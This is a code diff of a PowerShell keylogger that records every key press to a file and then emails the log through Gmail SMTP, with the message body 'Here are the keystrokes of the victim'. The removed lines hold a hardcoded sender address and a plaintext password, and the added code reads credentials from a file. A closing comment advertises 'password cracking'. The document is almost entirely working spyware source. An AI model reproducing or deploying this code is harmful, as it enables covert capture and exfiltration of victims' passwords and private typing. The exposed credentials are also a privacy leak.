@@ -1,17 +1,30 @@
-# Edit only this section!
-$TimesToRun = 2
-$RunTimeP = 1
-$From = "daniel.maderner@gmail.com"
-$Pass = "maddan21"
-$To = "daniel.maderner@gmail.com"
-$Subject = "Keylogger Results"
-$body = "Keylogger Results"
-$SMTPServer = "smtp.mail.com"
-$SMTPPort = "587"
-$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-############################
 
+function Send-Email() {
+    param(
+        [Parameter(mandatory=$true)][string]$To,
+        [Parameter(mandatory=$true)][string]$Subject,
+        [Parameter(mandatory=$true)][string]$Body
+    )
+    $username   = (Get-Content -Path 'switch2\credentials.txt')[0]
+    $password   = (Get-Content -Path 'switch2\credentials.txt')[1]
+    $secstr     = New-Object -TypeName System.Security.SecureString
+    $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 
+    $hash = @{
+        from       = $username
+        to         = $To
+        subject    = $Subject
+        smtpserver = "smtp.gmail.com"
+        body       = $Body 
+        Attachments = $Path
+        credential = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+        usessl     = $true
+        verbose    = $true
+    }
+
+    Send-MailMessage @hash
+    $hash
+}
 
 
 #requires -Version 2
@@ -37,14 +50,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
+    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and shows the collected key presses
-    $Runner = 0
-	while ($TimesToRun  -gt $Runner) {
-	$TimeStart = Get-Date
-	$TimeEnd = $timeStart.addminutes($RunTimeP)
-	while ($TimeEnd -gt $TimeNow) {
+    while ($true) {
       Start-Sleep -Milliseconds 40
       
       # scan all ASCII codes above 8
@@ -72,24 +82,23 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($success) 
           {
             # add key to logger file
+            Write-Host $mychar
             [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
           }
         }
       }
-	  $TimeNow = Get-Date
     }
-	$Runner++
-	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
-	Remove-Item -Path $Path -force
-	}
   }
   finally
   {
     # open logger file in Notepad
-	exit 1
+    notepad $Path
+    Send-Email -To "daniel.maderner@gmail.com" -Subject "keylogger" -Body "Here are the keystrokes of the victim: "
+
   }
 }
 
+# subscribe aasmtamizhan for more password cracking 
 # records all key presses until script is aborted by pressing CTRL+C
 # will then open the file with collected key codes
 Start-KeyLogger
